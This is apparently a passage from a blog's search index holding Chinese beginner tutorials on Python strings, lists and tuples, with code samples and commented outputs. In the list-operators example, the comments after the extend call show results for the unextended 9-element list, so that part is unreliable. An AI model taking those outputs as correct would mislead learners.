<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 检查开头和结尾字符串</span></span><br><span class="line"><span class="built_in">print</span>(name.startswith(<span class="string">&quot;z&quot;</span>))  <span class="comment"># 检查字符串是否是以某字符开头，返回布尔类型</span></span><br><span class="line"><span class="built_in">print</span>(name.endswith(<span class="string">&quot;z&quot;</span>))  <span class="comment"># 检查字符串是否是以某字符结尾，返回布尔类型</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># isdigit方法检查字符串是否由数字构成返回布尔值</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;12www&quot;</span>.isdigit())    <span class="comment"># False</span></span><br><span class="line"><span class="comment"># isalpha方法检查字符串是否以字母构成返回布尔值</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;12www&quot;</span>.isalpha())    <span class="comment"># False</span></span><br><span class="line"><span class="comment"># isalnum方法检查字符串是否以数字和字母构成返回布尔值</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;12www&quot;</span>.isalnum())    <span class="comment"># True</span></span><br><span class="line"><span class="comment"># isspace方法检查字符串中只包含空格，则返回true</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;   &quot;</span>.isspace())  <span class="comment">#True</span></span><br></pre></td></tr></table></figure>

<h6 id="3-4、格式化字符串"><a href="#3-4、格式化字符串" class="headerlink" title="3.4、格式化字符串"></a>3.4、格式化字符串</h6><p>在Python中，字符串类型可以通过<code>center</code>、<code>ljust</code>、<code>rjust</code>方法做居中、左对齐和右对齐的处理。如果要在字符串的左侧补零，也可以使用<code>zfill</code>方法。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">&#x27;hello, world&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># center方法以宽度20将字符串居中并在两侧填充*</span></span><br><span class="line"><span class="built_in">print</span>(s.center(<span class="number">20</span>, <span class="string">&#x27;*&#x27;</span>))  <span class="comment"># ****hello, world****</span></span><br><span class="line"><span class="comment"># rjust方法以宽度20将字符串右对齐并在左侧填充空格</span></span><br><span class="line"><span class="built_in">print</span>(s.rjust(<span class="number">20</span>))        <span class="comment">#         hello, world</span></span><br><span class="line"><span class="comment"># ljust方法以宽度20将字符串左对齐并在右侧填充~</span></span><br><span class="line"><span class="built_in">print</span>(s.ljust(<span class="number">20</span>, <span class="string">&#x27;~&#x27;</span>))   <span class="comment"># hello, world~~~~~~~~</span></span><br><span class="line"><span class="comment"># 在字符串的左侧补零</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;33&#x27;</span>.zfill(<span class="number">5</span>))      <span class="comment"># 00033</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;-33&#x27;</span>.zfill(<span class="number">5</span>))     <span class="comment"># -0033</span></span><br></pre></td></tr></table></figure>

<p>在用<code>print</code>函数输出字符串时，可以用下面的方式对字符串进行格式化。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">321</span></span><br><span class="line">b = <span class="number">123</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;%d * %d = %d&#x27;</span> % (a, b, a * b))</span><br></pre></td></tr></table></figure>

<p>我们也可以用字符串的方法来完成字符串的格式。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">321</span></span><br><span class="line">b = <span class="number">123</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#123;0&#125; * &#123;1&#125; = &#123;2&#125;&#x27;</span>.<span class="built_in">format</span>(a, b, a * b))</span><br><span class="line"></span><br><span class="line">c=<span class="number">17.125</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;0:.2f&#125;%&quot;</span>.<span class="built_in">format</span>(c))   <span class="comment">#17.12%</span></span><br></pre></td></tr></table></figure>

<p>从Python 3.6开始，格式化字符串还有更为简洁的书写方式，就是在字符串前加上<code>f</code>来格式化字符串，在这种以<code>f</code>打头的字符串中，<code>&#123;变量名&#125;</code>是一个占位符，会被变量对应的值将其替换掉。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">321</span></span><br><span class="line">b = <span class="number">123</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;a&#125;</span> * <span class="subst">&#123;b&#125;</span> = <span class="subst">&#123;a * b&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">c=<span class="number">17.125</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;c:<span class="number">.2</span>f&#125;</span>%&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>字符串格式化更多操作参照以下表格</p>
<table>
<thead>
<tr>
<th align="center">变量值</th>
<th align="center">占位符</th>
<th align="center">格式化结果</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>3.1415926</code></td>
<td align="center"><code>&#123;:.2f&#125;</code></td>
<td align="center"><code>&#39;3.14&#39;</code></td>
<td align="center">保留小数点后两位</td>
</tr>
<tr>
<td align="center"><code>3.1415926</code></td>
<td align="center"><code>&#123;:.0f&#125;</code></td>
<td align="center"><code>&#39;3&#39;</code></td>
<td align="center">不带小数</td>
</tr>
<tr>
<td align="center"><code>123</code></td>
<td align="center"><code>&#123;:0&gt;10d&#125;</code></td>
<td align="center"><code>&#39;0000000123&#39;</code></td>
<td align="center">左边补<code>0</code>，补够10位</td>
</tr>
<tr>
<td align="center"><code>123</code></td>
<td align="center"><code>&#123;:x&lt;10d&#125;</code></td>
<td align="center"><code>&#39;123xxxxxxx&#39;</code></td>
<td align="center">右边补<code>x</code> ，补够10位</td>
</tr>
<tr>
<td align="center"><code>123</code></td>
<td align="center"><code>&#123;:&gt;10d&#125;</code></td>
<td align="center"><code>&#39;       123&#39;</code></td>
<td align="center">左边补空格，补够10位</td>
</tr>
<tr>
<td align="center"><code>123</code></td>
<td align="center"><code>&#123;:&lt;10d&#125;</code></td>
<td align="center"><code>&#39;123       &#39;</code></td>
<td align="center">右边补空格，补够10位</td>
</tr>
<tr>
<td align="center"><code>123456789</code></td>
<td align="center"><code>&#123;:,&#125;</code></td>
<td align="center"><code>&#39;123,456,789&#39;</code></td>
<td align="center">逗号分隔格式</td>
</tr>
<tr>
<td align="center"><code>0.123</code></td>
<td align="center"><code>&#123;:.2%&#125;</code></td>
<td align="center"><code>&#39;12.30%&#39;</code></td>
<td align="center">百分比格式</td>
</tr>
<tr>
<td align="center"><code>123456789</code></td>
<td align="center"><code>&#123;:.2e&#125;</code></td>
<td align="center"><code>&#39;1.23e+08&#39;</code></td>
<td align="center">科学计数法格式</td>
</tr>
</tbody></table>
<h6 id="3-5、删除字符"><a href="#3-5、删除字符" class="headerlink" title="3.5、删除字符"></a>3.5、删除字符</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 删除字符，一般用来删除两端或一段的空字符</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;aabuafngg&quot;</span>.lstrip(<span class="string">&quot;a&quot;</span>))  <span class="comment"># 删除最左边的n个相同字符，默认为空字符</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;aabuafngg&quot;</span>.rstrip(<span class="string">&quot;a&quot;</span>))  <span class="comment"># 删除最右边的n个相同字符，默认为空字符</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;aabuafngg&quot;</span>.strip(<span class="string">&quot;a&quot;</span>))  <span class="comment"># 删除最左边或者最右边的n个相同字符，默认为空字符</span></span><br></pre></td></tr></table></figure>

<h6 id="3-6、替换操作"><a href="#3-6、替换操作" class="headerlink" title="3.6、替换操作"></a>3.6、替换操作</h6><p><code>replace</code>方法的第一个参数是被替换的内容，第二个参数是替换后的内容，还可以通过第三个参数指定替换的次数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 替换（replace）</span></span><br><span class="line"><span class="built_in">print</span>(name.replace(<span class="string">&quot;blog&quot;</span>, <span class="string">&quot;z7sz&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(name.replace(<span class="string">&quot;z&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="number">1</span>))  <span class="comment"># 数字表示替换几个</span></span><br></pre></td></tr></table></figure>

<h6 id="3-7、分割-x2F-合并操作"><a href="#3-7、分割-x2F-合并操作" class="headerlink" title="3.7、分割&#x2F;合并操作"></a>3.7、分割&#x2F;合并操作</h6><p>可以使用字符串的<code>split</code>方法将一个字符串拆分为多个字符串（放在一个列表中），也可以使用字符串的<code>join</code>方法将列表中的多个字符串连接成一个字符串。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">&#x27;I love you&#x27;</span></span><br><span class="line">words = s.split()</span><br><span class="line"><span class="built_in">print</span>(words)            <span class="comment"># [&#x27;I&#x27;, &#x27;love&#x27;, &#x27;you&#x27;]</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;#&#x27;</span>.join(words))  <span class="comment"># I#love#you</span></span><br></pre></td></tr></table></figure>

<p><code>split</code>方法默认使用空格进行拆分，我们也可以指定其他的字符来拆分字符串，而且还可以指定最大拆分次数来控制拆分的效果。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">&#x27;I#love#you#so#much&#x27;</span></span><br><span class="line">words = s.split(<span class="string">&#x27;#&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(words)  <span class="comment"># [&#x27;I&#x27;, &#x27;love&#x27;, &#x27;you&#x27;, &#x27;so&#x27;, &#x27;much&#x27;]</span></span><br><span class="line">words = s.split(<span class="string">&#x27;#&#x27;</span>, <span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(words)  <span class="comment"># [&#x27;I&#x27;, &#x27;love&#x27;, &#x27;you&#x27;, &#x27;so#much&#x27;]</span></span><br></pre></td></tr></table></figure>

<h6 id="3-8、其他方法"><a href="#3-8、其他方法" class="headerlink" title="3.8、其他方法"></a>3.8、其他方法</h6><p>对于字符串类型来说，还有一个常用的操作是对字符串进行匹配检查，即检查字符串是否满足某种特定的模式。例如，一个网站对用户注册信息中用户名和邮箱的检查，就属于模式匹配检查。实现模式匹配检查的工具叫做正则表达式，Python语言通过标准库中的<code>re</code>模块提供了对正则表达式的支持，正则表达式这里不讲，涉及到更深层次的知识。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 计算某字符出现的频率</span></span><br><span class="line"><span class="built_in">print</span>(name.count(<span class="string">&quot;n&quot;</span>))</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python基础</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构——列表</title>
    <url>/post/2e55ef67.html</url>
    <content><![CDATA[<hr>
<blockquote>
<p>本章概述：python基础——列表的基本使用</p>
</blockquote>
<hr>
<span id="more"></span>

<h4 id="一、列表的定义"><a href="#一、列表的定义" class="headerlink" title="一、列表的定义"></a>一、列表的定义</h4><p>Python内置的一种数据类型是列表：list。list是一种有序的集合，可以随时添加和删除其中的元素，可以保存多个数据，而且允许有重复数据。</p>
<p>在Python中，可以使用<code>[]</code>字面量语法来定义列表，列表中的多个元素用逗号进行分隔。列表支持嵌套，但是在创建列表嵌套时，不能用<code>[[0] * 3] * 5]</code>类似方式来创建嵌套列表。比如我们需要创建一个5*3的列表，应该 <code>[[0] * 3 for _ in range(5)]</code>这么创建。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1 = [<span class="string">&quot;z7sz&quot;</span>, <span class="string">&quot;blog&quot;</span>, <span class="number">100</span>, [<span class="string">&quot;top&quot;</span>, <span class="string">&quot;python&quot;</span>, <span class="number">88</span>]]</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建一个5*3的列表嵌套</span></span><br><span class="line">scores1 = [[<span class="number">0</span>] * <span class="number">3</span>] * <span class="number">5</span></span><br><span class="line"><span class="built_in">print</span>(scores1)    <span class="comment"># [[0, 0, 0], [0, 0, 0], [0, 0, 0], [0, 0, 0], [0, 0, 0]]</span></span><br><span class="line"></span><br><span class="line">scores2 = [[<span class="number">0</span>] * <span class="number">3</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line"><span class="built_in">print</span>(scores2)    <span class="comment"># [[0, 0, 0], [0, 0, 0], [0, 0, 0], [0, 0, 0], [0, 0, 0]]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#上面两种创建出来的列表嵌套看起来好像是一样的，但是当我们赋值时</span></span><br><span class="line">scores1[<span class="number">0</span>][<span class="number">0</span>] = <span class="string">&#x27;test&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(scores1)  <span class="comment">#[[&#x27;test&#x27;, 0, 0], [&#x27;test&#x27;, 0, 0], [&#x27;test&#x27;, 0, 0], [&#x27;test&#x27;, 0, 0], [&#x27;test&#x27;, 0, 0]]</span></span><br><span class="line"></span><br><span class="line">scores2[<span class="number">0</span>][<span class="number">0</span>] = <span class="string">&#x27;test&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(scores2)  <span class="comment">#[[&#x27;test&#x27;, 0, 0], [0, 0, 0], [0, 0, 0], [0, 0, 0], [0, 0, 0]]</span></span><br></pre></td></tr></table></figure>

<p>很明显，第一种创建嵌套列表的方法是错误的。第二种方法的创建方式叫做列表推导式，在下面会讲到。</p>
<p>我们也可以通过Python内置的<code>list</code>函数将其他序列变成列表。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1 = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>))</span><br><span class="line">list2 = <span class="built_in">list</span>(<span class="string">&#x27;z7sz&#x27;</span>)  <span class="comment">#[&#x27;z&#x27;, &#x27;7&#x27;, &#x27;s&#x27;, &#x27;z&#x27;]</span></span><br></pre></td></tr></table></figure>

<p>列表是一种可变数据类型，也就是说列表可以添加元素、删除元素、更新元素，这一点跟字符串是不同的。我们后面也会出一篇来讲讲可变和不可变类型的区别。</p>
<h4 id="二、列表的使用"><a href="#二、列表的使用" class="headerlink" title="二、列表的使用"></a>二、列表的使用</h4><h5 id="1、列表的运算符"><a href="#1、列表的运算符" class="headerlink" title="1、列表的运算符"></a>1、列表的运算符</h5><p>和字符串类型一样，列表也支持拼接、重复、成员运算、索引和切片以及比较运算。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">items1 = [<span class="number">35</span>, <span class="number">12</span>, <span class="number">99</span>, <span class="number">68</span>, <span class="number">55</span>, <span class="number">87</span>]</span><br><span class="line">items2 = [<span class="number">45</span>, <span class="number">8</span>, <span class="number">29</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列表的拼接</span></span><br><span class="line">items3 = items1 + items2</span><br><span class="line"><span class="built_in">print</span>(items3)    <span class="comment"># [35, 12, 99, 68, 55, 87, 45, 8, 29]</span></span><br><span class="line"><span class="comment"># 列表拼接也可以用extend进行拼接</span></span><br><span class="line">items3.extend(items1)</span><br><span class="line"><span class="built_in">print</span>(items3)   <span class="comment">#[35, 12, 99, 68, 55, 87, 45, 8, 29, 35, 12, 99, 68, 55, 87]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 列表的重复</span></span><br><span class="line">items4 = [<span class="string">&#x27;hello&#x27;</span>] * <span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(items4)    <span class="comment"># [&#x27;hello&#x27;, &#x27;hello&#x27;, &#x27;hello&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 列表的成员运算</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">100</span> <span class="keyword">in</span> items3)        <span class="comment"># False</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;hello&#x27;</span> <span class="keyword">in</span> items4)    <span class="comment"># True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取列表的长度(元素个数)</span></span><br><span class="line">size = <span class="built_in">len</span>(items3)</span><br><span class="line"><span class="built_in">print</span>(size)                 <span class="comment"># 9</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 列表的索引</span></span><br><span class="line"><span class="built_in">print</span>(items3[<span class="number">0</span>], items3[-size])        <span class="comment"># 35 35</span></span><br><span class="line">items3[-<span class="number">1</span>] = <span class="number">100</span></span><br><span class="line"><span class="built_in">print</span>(items3[size - <span class="number">1</span>], items3[-<span class="number">1</span>])    <span class="comment"># 100 100</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 列表的切片</span></span><br><span class="line"><span class="built_in">print</span>(items3[:<span class="number">5</span>])          <span class="comment"># [35, 12, 99, 68, 55]</span></span><br><span class="line"><span class="built_in">print</span>(items3[<span class="number">4</span>:])          <span class="comment"># [55, 87, 45, 8, 100]</span></span><br><span class="line"><span class="built_in">print</span>(items3[-<span class="number">5</span>:-<span class="number">7</span>:-<span class="number">1</span>])    <span class="comment"># [55, 68]</span></span><br><span class="line"><span class="built_in">print</span>(items3[::-<span class="number">2</span>])        <span class="comment"># [100, 45, 55, 99, 35]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 列表的比较运算</span></span><br><span class="line">items5 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">items6 = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">1</span>, <span class="number">5</span>))</span><br><span class="line"><span class="comment"># 两个列表比较相等性比的是对应索引位置上的元素是否相等</span></span><br><span class="line"><span class="built_in">print</span>(items5 == items6)    <span class="comment"># True</span></span><br><span class="line">items7 = [<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>]</span><br><span class="line"><span class="comment"># 两个列表比较大小比的是对应索引位置上的元素的大小</span></span><br><span class="line"><span class="built_in">print</span>(items5 &lt;= items7)    <span class="comment"># True</span></span><br></pre></td></tr></table></figure>

<p>由于列表是可变类型，所以通过索引操作既可以获取列表中的元素，也可以更新列表中的元素。</p>
<h5 id="2、列表的遍历"><a href="#2、列表的遍历" class="headerlink" title="2、列表的遍历"></a>2、列表的遍历</h5><p>如果想逐个取出列表中的元素，可以使用<code>for</code>循环的。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">items = [<span class="string">&#x27;Python&#x27;</span>, <span class="string">&#x27;Java&#x27;</span>, <span class="string">&#x27;Go&#x27;</span>, <span class="string">&#x27;Kotlin&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> items:</span><br><span class="line">    <span class="built_in">print</span>(item)</span><br></pre></td></tr></table></figure>

<h5 id="3、列表的方法"><a href="#3、列表的方法" class="headerlink" title="3、列表的方法"></a>3、列表的方法</h5><h6 id="3-1、添加和删除"><a href="#3-1、添加和删除" class="headerlink" title="3.1、添加和删除"></a>3.1、添加和删除</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">items = [<span class="number">10</span>,<span class="number">12</span>,<span class="number">14</span>,<span class="number">16</span>,<span class="string">&#x27;z7sz&#x27;</span>,<span class="string">&#x27;blog&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用append方法在列表尾部添加元素</span></span><br><span class="line">items.append(<span class="string">&#x27;top&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(items)   <span class="comment">#[10, 12, 14, 16, &#x27;z7sz&#x27;, &#x27;blog&#x27;, &#x27;top&#x27;]</span></span><br><span class="line"><span class="comment"># 使用insert方法在列表指定索引位置插入元素</span></span><br><span class="line">items.insert(<span class="number">1</span>, <span class="string">&#x27;python&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(items)    <span class="comment">#[10, &#x27;python&#x27;, 12, 14, 16, &#x27;z7sz&#x27;, &#x27;blog&#x27;, &#x27;top&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除指定的元素</span></span><br><span class="line">items.remove(<span class="string">&#x27;python&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(items)   <span class="comment">#[10, 12, 14, 16, &#x27;z7sz&#x27;, &#x27;blog&#x27;, &#x27;top&#x27;]</span></span><br><span class="line"><span class="comment"># 删除指定索引位置的元素</span></span><br><span class="line">items.pop(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(items)  <span class="comment">#[12, 14, 16, &#x27;z7sz&#x27;, &#x27;blog&#x27;, &#x27;top&#x27;]</span></span><br><span class="line"><span class="comment">#使用del关键字删除元素</span></span><br><span class="line"><span class="keyword">del</span> items[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(items)  <span class="comment">#[14, 16, &#x27;z7sz&#x27;, &#x27;blog&#x27;, &#x27;top&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 清空列表中的元素</span></span><br><span class="line">items.clear()</span><br><span class="line"><span class="built_in">print</span>(items)   <span class="comment">#[]</span></span><br></pre></td></tr></table></figure>

<p>remove方法删除元素时，当元素不在列表中，会报错。使用pop删除元素时，当索引超出范围，也会报错。</p>
<h6 id="3-2、寻找和统计"><a href="#3-2、寻找和统计" class="headerlink" title="3.2、寻找和统计"></a>3.2、寻找和统计</h6><p>列表类型的<code>index</code>方法可以查找某个元素在列表中的索引位置；因为列表中允许有重复的元素，所以列表类型提供了<code>count</code>方法来统计一个元素在列表中出现的次数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">items = [<span class="string">&#x27;blog&#x27;</span>,<span class="number">10</span>,<span class="number">12</span>,<span class="number">14</span>,<span class="number">16</span>,<span class="string">&#x27;z7sz&#x27;</span>,<span class="string">&#x27;blog&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找元素的索引位置,后面的数字表示从哪里开始寻找，如果在列表中寻找不到，会报错</span></span><br><span class="line"><span class="built_in">print</span>(items.index(<span class="string">&#x27;blog&#x27;</span>))   <span class="comment">#0</span></span><br><span class="line"><span class="built_in">print</span>(items.index(<span class="string">&#x27;blog&#x27;</span>,<span class="number">2</span>))  <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找元素出现的次数</span></span><br><span class="line"><span class="built_in">print</span>(items.count(<span class="string">&#x27;blog&#x27;</span>))  <span class="comment">#2</span></span><br><span class="line"><span class="built_in">print</span>(items.count(<span class="string">&#x27;python&#x27;</span>))  <span class="comment">#0</span></span><br></pre></td></tr></table></figure>

<h6 id="3-3、元素的排序和反转"><a href="#3-3、元素的排序和反转" class="headerlink" title="3.3、元素的排序和反转"></a>3.3、元素的排序和反转</h6><p>列表的<code>sort</code>操作可以实现列表元素的排序，而<code>reverse</code>操作可以实现元素的反转，这两个方法要求列表中的元素是同一类型。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">items = [<span class="number">10</span>,<span class="number">12</span>,<span class="number">14</span>,<span class="number">16</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 排序</span></span><br><span class="line">items.sort()</span><br><span class="line"><span class="built_in">print</span>(items)  <span class="comment">#[1, 4, 5, 9, 10, 12, 14, 16]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 反转</span></span><br><span class="line">items.reverse()</span><br><span class="line"><span class="built_in">print</span>(items)  <span class="comment">#[16, 14, 12, 10, 9, 5, 4, 1]</span></span><br></pre></td></tr></table></figure>

<h6 id="3-4、列表推导式"><a href="#3-4、列表推导式" class="headerlink" title="3.4、列表推导式"></a>3.4、列表推导式</h6><p>在Python中，列表还可以通过一种特殊的字面量语法来创建，这种语法叫做生成式。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建一个由1到9的数字构成的列表</span></span><br><span class="line">items1 = [x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>)]</span><br></pre></td></tr></table></figure>

<p>列表推导式生成列表跟普通的for循环+append生成列表相比，列表推导式拥有更好的性能。</p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python基础</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构——元组</title>
    <url>/post/80173a1b.html</url>
    <content><![CDATA[<hr>
<blockquote>
<p>本章概述：python基础——元组的基本使用以及元组和列表的优缺点</p>
</blockquote>
<hr>
<span id="more"></span>

<h4 id="一、元组的定义和使用"><a href="#一、元组的定义和使用" class="headerlink" title="一、元组的定义和使用"></a>一、元组的定义和使用</h4><p>元组也是一种有序列表，跟list很像，但是元组是不可变类型，元组类型的变量一旦定义，其中的元素不能再添加或删除，而且元素的值也不能进行修改。元组用小括号进行定义，而元组的方法也跟列表差不多。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义一个四元组</span></span><br><span class="line">tuple1 = (<span class="number">1</span>, <span class="string">&quot;2&quot;</span>, <span class="literal">True</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看元组中元素的数量</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(tuple1))  <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过索引运算获取元组中的元素</span></span><br><span class="line"><span class="built_in">print</span>(tuple1[<span class="number">0</span>])  <span class="comment">#1</span></span><br><span class="line"><span class="built_in">print</span>(tuple1[<span class="number">2</span>])  <span class="comment">#True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 循环遍历元组中的元素</span></span><br><span class="line"><span class="keyword">for</span> member <span class="keyword">in</span> tuple1:</span><br><span class="line">    <span class="built_in">print</span>(member)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 成员运算</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">1</span> <span class="keyword">in</span> tuple1)  <span class="comment">#True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">2</span> <span class="keyword">in</span> tuple1)  <span class="comment">#False</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#拼接</span></span><br><span class="line">tuple2=(<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>)</span><br><span class="line">tuple3=tuple1+tuple2</span><br><span class="line"><span class="built_in">print</span>(tuple3)  <span class="comment">#(1, &#x27;2&#x27;, True, &#x27;3&#x27;, 3, 4, 5)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 切片</span></span><br><span class="line"><span class="built_in">print</span>(tuple3[::<span class="number">3</span>])  <span class="comment">#(1, &#x27;3&#x27;, 5)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 比较运算</span></span><br><span class="line"><span class="built_in">print</span>(tuple1 == tuple2)    <span class="comment"># False</span></span><br><span class="line"><span class="built_in">print</span>(tuple1 &gt;= tuple3)    <span class="comment"># False</span></span><br><span class="line"><span class="built_in">print</span>(tuple1 &lt; (<span class="number">30</span>, <span class="number">11</span>, <span class="number">55</span>))    <span class="comment"># True</span></span><br></pre></td></tr></table></figure>

<p><code>()</code>表示空元组，但是如果元组中只有一个元素，需要加上一个逗号，否则<code>()</code>就不是代表元组的字面量语法，而是改变运算优先级的圆括号，所以<code>(&#39;hello&#39;, )</code>和<code>(100, )</code>才是一元组，而<code>(&#39;hello&#39;)</code>和<code>(100)</code>只是字符串和整数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>test=(<span class="number">1</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(test)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;int&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>test1=(<span class="number">1</span>,)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(test1)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;tuple&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>

<h4 id="二、列表和元组的区别"><a href="#二、列表和元组的区别" class="headerlink" title="二、列表和元组的区别"></a>二、列表和元组的区别</h4><p>仔细看了一下列表和元组，会发现，列表相对于元组而言，只是数据类型不一样而已，元组是不可变类型，列表是可变类型，那么这两种数据结构有啥区别，既然有了列表为啥还要元组呢。</p>
<p>1、占用空间不同</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>l1=[]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>l1.__sizeof__()</span><br><span class="line"><span class="number">40</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t1=()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t1.__sizeof__()</span><br><span class="line"><span class="number">24</span></span><br></pre></td></tr></table></figure>

<p>同样是空的，但是列表比元组多了16字节的空间存储。列表是可变类型的，意味着他是动态的，需要更多额外的空间，而元组是不可变类型，一旦创建，空间也就固定下来了，不需要额外的空间。事实上，除了空间大小的区别，在保存创建相同元素的时候，元组花费的时间更少，性能速度要优于列表</p>
<p>2、更适用于多线程环境：元组是不可变类型，不可变类型更适合于多线程环境，是不需要加锁的。</p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python基础</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构——字典和集合</title>
    <url>/post/3e25d6ff.html</url>
    <content><![CDATA[<hr>
<blockquote>
<p>本章概述：python基础——字典和集合的基本使用</p>
</blockquote>
<hr>
<span id="more"></span>

